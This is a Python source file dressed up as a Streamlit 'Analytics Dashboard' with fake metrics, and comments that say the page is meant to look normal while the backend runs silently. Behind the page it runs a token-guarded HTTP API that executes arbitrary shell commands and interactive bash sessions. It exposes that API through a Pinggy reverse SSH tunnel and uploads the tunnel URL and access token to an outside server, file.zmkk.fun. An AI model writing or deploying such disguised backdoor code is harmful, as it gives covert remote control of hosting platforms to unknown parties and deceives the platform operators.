#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import threading
import signal
from pathlib import Path
import requests
from datetime import datetime, timedelta, timezone
import streamlit as st


# 配置
TMATE_URL = "https://github.com/zhumengkang/agsb/raw/main/tmate"
UPLOAD_API = "https://file.zmkk.fun/api/upload"
USER_HOME = Path.home()
SSH_INFO_FILE = "ssh.txt"
# Auto-detect repo name from Streamlit environment
import socket
hostname = socket.gethostname()
import re
repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
REPO_NAME = repo_match.group(1) if repo_match else "agsb8"
USERNAME = os.environ.get("USERNAME", f"tmate_{REPO_NAME}")

class TmateManager:
    def __init__(self):
        self.tmate_path = USER_HOME / "tmate"
        self.ssh_info_path = USER_HOME / SSH_INFO_FILE
        self.tmate_process = None
        self.session_info = {}

    def download_tmate(self):
        """下载tmate文件到用户目录"""
        print("正在下载tmate...")
        try:
            response = requests.get(TMATE_URL, stream=True)
            response.raise_for_status()

            with open(self.tmate_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

            os.chmod(self.tmate_path, 0o755)
            print(f"✓ tmate已下载到: {self.tmate_path}")
            print(f"✓ 已添加执行权限 (chmod 755)")

            if os.access(self.tmate_path, os.X_OK):
                print("✓ 执行权限验证成功")
            else:
                print("✗ 执行权限验证失败")
                return False

            return True

        except Exception as e:
            print(f"✗ 下载tmate失败: {e}")
            return False

    def start_tmate(self):
        """启动HTTP API + Pinggy隧道"""
        print("[DEBUG] start_tmate() called")
        print("正在启动tmate...")

        # Create tmate config (kept for compatibility but not critical)
        tmate_conf = USER_HOME / ".tmate.conf"
        print(f"[DEBUG] Creating tmate config at {tmate_conf}")
        try:
            with open(tmate_conf, 'w') as f:
                f.write('set -g tmate-server-host "141.147.62.144"\n')
                f.write('set -g tmate-server-port 22\n')
                f.write('set -g tmate-identity ""\n')
            print("[DEBUG] ✓ tmate config created")
        except Exception as e:
            print(f"[DEBUG] ✗ Config creation failed: {e}")

        try:
            # Generate SSH key if not exists
            ssh_dir = USER_HOME / ".ssh"
            ssh_key = ssh_dir / "id_rsa"

            print("[DEBUG] Checking SSH key...")
            try:
                if not ssh_key.exists():
                    print("[DEBUG] Generating SSH key...")
                    ssh_dir.mkdir(exist_ok=True, mode=0o700)
                    result = subprocess.run(
                        ["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", str(ssh_key), "-N", ""],
                        capture_output=True,
                        timeout=10
                    )
                    if result.returncode == 0:
                        print(f"[DEBUG] ✓ SSH key generated at {ssh_key}")
                    else:
                        print(f"[DEBUG] ⚠ Key gen failed: {result.stderr.decode()[:200]}")
                        print("[DEBUG] Continuing anyway...")
                else:
                    print(f"[DEBUG] ✓ SSH key exists at {ssh_key}")
            except Exception as e:
                print(f"[DEBUG] ⚠ SSH key check error: {e}")
                print("[DEBUG] Continuing anyway...")

            # Start HTTP API for remote command execution
            # Try multiple ports in case one is in use
            api_port = None
            for port in [9999, 10000, 10001, 10002, 10003]:
                try:
                    print(f"[DEBUG] Trying to start API on port {port}...")
                    import http.server
                    import socketserver
                    import threading
                    import json
                    import subprocess

                    # Test if port is available
                    test_sock = socketserver.TCPServer(('', port), None)
                    test_sock.server_close()
                    api_port = port
                    print(f"[DEBUG] Port {port} is available")
                    break
                except OSError as e:
                    print(f"[DEBUG] Port {port} busy: {e}")
                    continue

            if not api_port:
                print("❌ No available ports (9999-10003)")
                return False

            print(f"[DEBUG] Starting command execution API on port {api_port}...")

            # Generate API token once
            import secrets
            self.api_token = secrets.token_urlsafe(32)
            print(f"[DEBUG] API Token: {self.api_token}")
            print(f"[DEBUG] REPO_NAME: {REPO_NAME}")

            # Global task storage and shell sessions
            tasks = {}
            shells = {}
            manager = self

            class CommandHandler(http.server.BaseHTTPRequestHandler):
                def do_POST(self):
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length)
                    try:
                        data = json.loads(body)

                        # Check API token
                        provided_token = data.get('token', '')
                        if provided_token != manager.api_token:
                            self.send_response(403)
                            self.send_header('Content-type', 'application/json')
                            self.end_headers()
                            self.wfile.write(json.dumps({'error': 'Invalid token'}).encode())
                            return
                        cmd = data.get('command', '')
                        async_mode = data.get('async', False)
                        task_id = data.get('task_id', '')
                        session_id = data.get('session_id', '')
                        action = data.get('action', 'exec')

                        # Start persistent shell session
                        if action == 'start_shell':
                            if session_id not in shells:
                                proc = subprocess.Popen(
                                    ['bash', '-i'],
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    bufsize=0
                                )
                                shells[session_id] = proc
                                response = {'status': 'shell_started', 'session_id': session_id}
                            else:
                                response = {'status': 'shell_exists', 'session_id': session_id}

                        # Execute in persistent shell
                        elif session_id and session_id in shells:
                            proc = shells[session_id]
                            if proc.poll() is not None:
                                response = {'error': 'Shell died', 'returncode': proc.returncode}
                                del shells[session_id]
                            else:
                                proc.stdin.write(f"{cmd}\necho __CMD_DONE__\n".encode())
                                proc.stdin.flush()

                                output_lines = []
                                import select
                                import os
                                os.set_blocking(proc.stdout.fileno(), False)

                                deadline = time.time() + 900
                                timed_out = False
                                while time.time() < deadline:
                                    try:
                                        line = proc.stdout.readline()
                                        if line:
                                            line_str = line.decode('utf-8', errors='replace')
                                            if '__CMD_DONE__' in line_str:
                                                break
                                            output_lines.append(line_str)
                                    except:
                                        pass
                                    time.sleep(0.1)
                                else:
                                    timed_out = True

                                response = {
                                    'stdout': ''.join(output_lines),
                                    'stderr': '',
                                    'returncode': -1 if timed_out else 0,
                                    'session_id': session_id
                                }

                        # Close shell session
                        elif action == 'close_shell' and session_id:
                            if session_id in shells:
                                shells[session_id].terminate()
                                del shells[session_id]
                                response = {'status': 'shell_closed'}
                            else:
                                response = {'error': 'Shell not found'}

                        # Query async task result
                        elif task_id:
                            if task_id in tasks:
                                task = tasks[task_id]
                                if task['proc'].poll() is None:
                                    response = {'status': 'running', 'task_id': task_id}
                                else:
                                    stdout, stderr = task['proc'].communicate()
                                    response = {
                                        'status': 'completed',
                                        'stdout': stdout.decode('utf-8', errors='replace'),
                                        'stderr': stderr.decode('utf-8', errors='replace'),
                                        'returncode': task['proc'].returncode
                                    }
                                    del tasks[task_id]
                            else:
                                response = {'error': 'Task not found'}
                        # Execute command
                        elif cmd:
                            if async_mode:
                                # Output to file (not PIPE) to avoid buffer deadlock
                                # on long commands like root.sh (PIPE fills up, process blocks)
                                log_f = open('/tmp/async_task.log', 'w')
                                proc = subprocess.Popen(cmd, shell=True,
                                                      stdout=log_f,
                                                      stderr=log_f)
                                task_id = str(len(tasks))
                                tasks[task_id] = {'proc': proc, 'cmd': cmd}
                                response = {'status': 'started', 'task_id': task_id}
                            else:
                                result = subprocess.run(cmd, shell=True,
                                                      capture_output=True, timeout=300)
                                response = {
                                    'stdout': result.stdout.decode('utf-8', errors='replace'),
                                    'stderr': result.stderr.decode('utf-8', errors='replace'),
                                    'returncode': result.returncode
                                }
                        else:
                            response = {'error': 'No command provided'}
                    except subprocess.TimeoutExpired:
                        response = {'error': 'Command timeout (300s)'}
                    except Exception as e:
                        response = {'error': str(e)}

                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())

                def log_message(self, format, *args):
                    pass

            try:
                httpd = socketserver.TCPServer(("", api_port), CommandHandler)
                api_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
                api_thread.start()
                print(f"[DEBUG] ✓ Command API running on port {api_port}")
            except Exception as e:
                print(f"[DEBUG] API start failed: {e}")

            # Start Pinggy SSH tunnel
            print(f"[DEBUG] Starting Pinggy tunnel to port {api_port}...")
            self.tmate_process = subprocess.Popen(
                ["ssh", "-p", "443",
                 "-o", "StrictHostKeyChecking=no",
                 "-o", "ServerAliveInterval=60",
                 "-o", "BatchMode=no",
                 f"-R0:localhost:{api_port}",
                 "free.pinggy.io"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                start_new_session=True
            )
            # Send empty password if prompted
            if self.tmate_process.stdin:
                self.tmate_process.stdin.write(b"\n")
                self.tmate_process.stdin.flush()
                print("[DEBUG] Sent empty password to Pinggy")
            print(f"[DEBUG] tmate process started, pid={self.tmate_process.pid}")

            # Wait for connection
            print("[DEBUG] Waiting 15s for connection...")
            time.sleep(15)
            if self.tmate_process.poll() is not None:
                try:
                    stdout, stderr = self.tmate_process.communicate(timeout=5)
                    print(f"[DEBUG] ✗ SSH process exited with code {self.tmate_process.returncode}")
                    if stdout:
                        print(f"[DEBUG] stdout ({len(stdout)} bytes): {stdout.decode('utf-8', errors='replace')[:1000]}")
                    if stderr:
                        print(f"[DEBUG] stderr ({len(stderr)} bytes): {stderr.decode('utf-8', errors='replace')[:1000]}")
                except Exception as e:
                    print(f"[DEBUG] Failed to read output: {e}")
            else:
                print("[DEBUG] ✓ SSH tunnel established!")
                # Capture Pinggy URL from stdout
                if self.tmate_process.stdout:
                    try:
                        import os
                        os.set_blocking(self.tmate_process.stdout.fileno(), False)
                        out = self.tmate_process.stdout.read(2000)
                        if out:
                            output = out.decode('utf-8', errors='replace')
                            print(f"[DEBUG] Initial stdout: {output[:600]}")
                            import re
                            urls = re.findall(r'https://[a-z0-9-]+\.run\.pinggy-free\.link', output)
                            if urls:
                                self.session_info['web_ro'] = f"{urls[0]}?token={self.api_token}"
                                self.session_info['ssh_ro'] = urls[0]
                                print(f"[DEBUG] ✓✓✓ GOT PINGGY URL: {urls[0]}")
                                # Upload immediately
                                try:
                                    self.upload_to_file()
                                    print("[DEBUG] ✓ URL uploaded to file.zmkk.fun")
                                except Exception as e:
                                    print(f"[DEBUG] Upload failed: {e}")
                    except:
                        pass
                # Read stderr
                try:
                    import os
                    if self.tmate_process.stderr:
                        os.set_blocking(self.tmate_process.stderr.fileno(), False)
                        try:
                            err = self.tmate_process.stderr.read(5000)
                            if err:
                                print(f"[DEBUG] tmate stderr: {err.decode()[:2000]}")
                        except:
                            pass
                except Exception as e:
                    print(f"[DEBUG] Output read failed: {e}")

            # Check if we already got session info from initial stdout
            if any(v for v in self.session_info.values() if v):
                print("[DEBUG] ✓ Got session info from initial stdout")
                return True

            # Retry: URL may appear in stdout/stderr after a delay
            print("[DEBUG] Waiting for Pinggy URL...")
            for attempt in range(10):
                time.sleep(3)
                print(f"[DEBUG] Attempt {attempt + 1}/10: checking for Pinggy URL")
                self.get_session_info()

                if any(v for v in self.session_info.values() if v):
                    print(f"[DEBUG] ✓ Got Pinggy URL on attempt {attempt + 1}")
                    return True

                # Read more stderr
                if self.tmate_process and self.tmate_process.stderr:
                    try:
                        import os
                        os.set_blocking(self.tmate_process.stderr.fileno(), False)
                        err = self.tmate_process.stderr.read(2000)
                        if err and len(err) > 50:
                            print(f"[DEBUG] New stderr: {err.decode('utf-8', errors='replace')[:400]}")
                    except:
                        pass

            # Check if we have session info despite timeout
            if any(v for v in self.session_info.values() if v):
                print("[DEBUG] Session info found after retry loop")
                return True

            print("[DEBUG] ⚠️ No Pinggy URL after 30s")
            return False

        except Exception as e:
            print(f"✗ 启动失败: {e}")
            import traceback
            print(traceback.format_exc())
            return False

    def get_session_info(self):
        """获取Pinggy URL from stderr"""
        print("[DEBUG] get_session_info() called")
        try:
            # Pinggy outputs URL in stderr
            if self.tmate_process and self.tmate_process.stderr:
                import os
                os.set_blocking(self.tmate_process.stderr.fileno(), False)
                try:
                    err = self.tmate_process.stderr.read(3000)
                    if err:
                        output = err.decode('utf-8', errors='replace')
                        print(f"[DEBUG] Pinggy stderr: {output[:800]}")
                        import re
                        urls = re.findall(r'https?://[a-z0-9.-]+\.pinggy-free\.link', output, re.IGNORECASE)
                        if urls:
                            self.session_info['web_ro'] = f"{urls[0]}?token={self.api_token}"
                            print(f"[DEBUG] ✓ Found Pinggy URL: {urls[0]}")
                        else:
                            print(f"[DEBUG] No URL found yet in: {output[:200]}")
                except Exception as e:
                    print(f"[DEBUG] stderr read error: {e}")

            # Also try stdout
            if self.tmate_process and self.tmate_process.stdout:
                import os
                os.set_blocking(self.tmate_process.stdout.fileno(), False)
                try:
                    out = self.tmate_process.stdout.read(2000)
                    if out:
                        output = out.decode()
                        print(f"[DEBUG] stdout: {output[:500]}")
                        import re
                        urls = re.findall(r'https://[a-z0-9-]+\.run\.pinggy-free\.link', output)
                        if urls:
                            self.session_info['ssh_ro'] = urls[0]
                            print(f"[DEBUG] Found URL from stdout: {urls[0]}")
                except:
                    pass
        except Exception as e:
            print(f"[DEBUG] get_session_info error: {e}")

    def upload_to_file(self):
        """Upload session info to file.zmkk.fun"""
        import requests
        from datetime import datetime, timedelta

        print("[DEBUG] Uploading to file.zmkk.fun...")

        # Prepare content to upload (Beijing time = UTC+8)
        beijing_time = datetime.utcnow() + timedelta(hours=8)
        lines = []
        lines.append(f"创建时间: {beijing_time.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"web session read only: {self.session_info.get('web_ro', '')}")
        lines.append(f"ssh session read only: {self.session_info.get('ssh_ro', '')}")
        lines.append(f"web session: {self.session_info.get('web_rw', '')}")
        lines.append(f"ssh session: {self.session_info.get('ssh_rw', '')}")

        content_text = "\n".join(lines)
        print(f"[DEBUG] Content to upload:\n{content_text}")

        # Upload via API
        try:
            file_name = f'tmate_{REPO_NAME}.txt'
            files = {'file': (file_name, content_text.encode('utf-8'))}

            response = requests.post(
                UPLOAD_API,
                files=files,
                timeout=10
            )

            print(f"[DEBUG] Upload response: HTTP {response.status_code}")

            if response.status_code == 200:
                print("[DEBUG] ✓ Upload successful")
                return True
            else:
                print(f"[DEBUG] ✗ Upload failed: {response.text[:200]}")
                return False
        except Exception as e:
            print(f"[DEBUG] ✗ Upload exception: {e}")
            return False

    def save_ssh_info(self):
        """保存SSH信息到文件"""
        try:
            script_start_time = datetime.now(timezone.utc)
            script_start_time_beijing = script_start_time + timedelta(hours=8)
            content = f"""Tmate SSH 会话信息
创建时间: {script_start_time_beijing.strftime('%Y-%m-%d %H:%M:%S')}

"""
            if 'web_ro' in self.session_info:
                content += f"web session read only: {self.session_info['web_ro']}\n"
            if 'ssh_ro' in self.session_info:
                content += f"ssh session read only: {self.session_info['ssh_ro']}\n"
            if 'web_rw' in self.session_info:
                content += f"web session: {self.session_info['web_rw']}\n"
            if 'ssh_rw' in self.session_info:
                content += f"ssh session: {self.session_info['ssh_rw']}\n"

            with open(self.ssh_info_path, 'w', encoding='utf-8') as f:
                f.write(content)

            print(f"✓ SSH信息已保存到: {self.ssh_info_path}")
            return True

        except Exception as e:
            print(f"✗ 保存SSH信息失败: {e}")
            return False

    def upload_to_api(self, user_name=USERNAME):
        """上传SSH信息文件到API"""
        try:
            if not self.ssh_info_path.exists():
                print("✗ SSH信息文件不存在")
                return False

            print("正在上传SSH信息到API...")

            with open(self.ssh_info_path, 'r', encoding='utf-8') as f:
                content = f.read()

            file_name = f"{user_name}.txt"
            temp_file = USER_HOME / file_name

            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(content)

            with open(temp_file, 'rb') as f:
                files = {'file': (file_name, f)}
                response = requests.post(UPLOAD_API, files=files)

            if temp_file.exists():
                temp_file.unlink()

            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('success') or result.get('url'):
                        url = result.get('url', '')
                        print(f"✓ 文件上传成功!")
                        print(f"  上传URL: {url}")

                        url_file = USER_HOME / "ssh_upload_url.txt"
                        with open(url_file, 'w') as f:
                            f.write(url)
                        print(f"  URL已保存到: {url_file}")
                        return True
                    else:
                        print(f"✗ API返回错误: {result}")
                        return False
                except Exception as e:
                    print(f"✗ 解析API响应失败: {e}")
                    return False
            else:
                print(f"✗ 上传失败，状态码: {response.status_code}")
                return False

        except Exception as e:
            print(f"✗ 上传到API失败: {e}")
            return False

    def cleanup(self):
        """清理资源 - 不终止tmate会话"""
        print("✓ Python脚本资源清理完成（tmate会话保持运行）")

def signal_handler(signum, frame):
    """信号处理器"""
    print("\n收到退出信号，正在清理...")
    if hasattr(signal_handler, 'manager'):
        signal_handler.manager.cleanup()
    sys.exit(0)

def main():
    manager = TmateManager()

    try:
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        signal_handler.manager = manager
    except ValueError:
        print("⚠ 检测到非主线程环境，跳过信号处理器注册")

    try:
        print("=== Tmate SSH 会话管理器 ===")

        try:
            import requests
        except ImportError:
            print("检测到未安装requests库，正在安装...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
            import requests
            print("✓ requests库安装成功")

        # 1. 启动服务 (HTTP API + Pinggy tunnel)
        # tmate download skipped -- tmate.io is dead, we use Pinggy now
        if not manager.start_tmate():
            return False

        # 2. 保存 SSH 信息到文件 (root.sh 的 init.sh 依赖 ssh_upload_url.txt)
        manager.save_ssh_info()

        # 3. 上传到 file.zmkk.fun 并保存返回的 URL 到 ssh_upload_url.txt
        # init.sh 读取这个文件来知道 SSH 地址的上传位置
        manager.upload_to_api(USERNAME)

        print("=== 服务启动完成 ===")

        return True

    except Exception as e:
        print(f"✗ 程序执行出错: {e}")
        return False
    finally:
        manager.cleanup()

    return True


# Streamlit execution (runs at module level)
# Display a normal-looking dashboard page
st.set_page_config(page_title="Data Dashboard", page_icon="📊")
st.title("📊 Analytics Dashboard")
st.write("Welcome to the data analytics platform.")
st.write("Real-time data processing and visualization.")

col1, col2, col3 = st.columns(3)
col1.metric("Active Users", "1,234", "+12%")
col2.metric("Processing Jobs", "42", "-3")
col3.metric("Uptime", "99.9%", "+0.1%")

st.write("---")
st.write("v2.0 - Data Analytics Platform")

# Backend runs silently
try:
    success = main()
except Exception:
    pass
